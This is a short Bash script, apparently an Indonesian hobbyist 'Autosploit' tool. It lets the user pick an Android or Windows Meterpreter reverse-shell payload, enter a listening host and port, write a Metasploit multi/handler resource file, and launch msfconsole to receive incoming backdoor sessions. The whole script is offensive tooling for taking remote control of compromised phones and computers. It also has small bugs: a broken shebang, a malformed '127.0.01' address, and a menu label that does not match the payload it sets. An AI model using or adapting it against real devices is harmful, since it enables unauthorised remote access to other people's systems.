#!bin/bash
clear
echo '                         - Start Autosploit -                      '
sleep 0.5s
echo -n '                                 .'
sleep 0.5s
echo -n '.'
sleep 0.5s
echo '.'

x=1
while [ $x -le 76 ]
do
  echo -n "="
  sleep 0.02
  x=$(( $x + 1 ))
done
echo ''
toilet -f shadow -F metal 'VAGABOND CYBER'
sleep 0.05
#input pilihan
echo '          - Pilih Exploit -  '
sleep 0.09
echo '[1] android/meterpreter/reverse_tcp'
sleep 0.09
echo '[2] android/meterpreter/reverse_http'
sleep 0.09
echo '[3] windows/meterpreter/reverse_tcp'
sleep 0.09
echo '[4] windows/meterpreter/reverse_http'
sleep 0.09
pilihBackdoor(){
echo -n 'Masukan Pilihan sesuai nomor : '
read nomor
case $nomor in
1)
   tcp="android/meterpreter/reverse_tcp"
   ;;
2)
   tcp="android/meterpreter/reverse_https"
   ;;
3)
   tcp="windows/meterpreter/reverse_tcp"
   ;;
4)
   tcp="windows/meterpreter/reverse_http"
   ;;
*)
   echo "X Input tidak sesuai-pilih nomor X"
   pilihBackdoor
   ;;
esac
}
pilihBackdoor
sleep 0.09
#pilihan host/ip
echo '  -- Pilih Host/Ip --'
sleep 0.1s
echo '  [1] 127.0.0.1'
sleep 0.09
echo '  [2] Masukan sendiri Host/Ip...'
sleep 0.09
pilihHost(){
echo -n 'Masukan nomor pilihan : '
read nhost
case $nhost in
1)
  host="127.0.01"
  ;;
2)
  echo -n 'Masukan Host/Ip : '
  read host
  ;;
*)
  echo 'X input tidak sesuai-pilih nomor X'
  pilihHost
  ;;
esac
}
pilihHost
echo -n 'Masukan Port : '
read port

#create file
cat > listener.rc <<EOF
use exploit/multi/handler
set payload $tcp
set lhost $host
set lport $port
EOF

msfconsole -q -r listener.rc
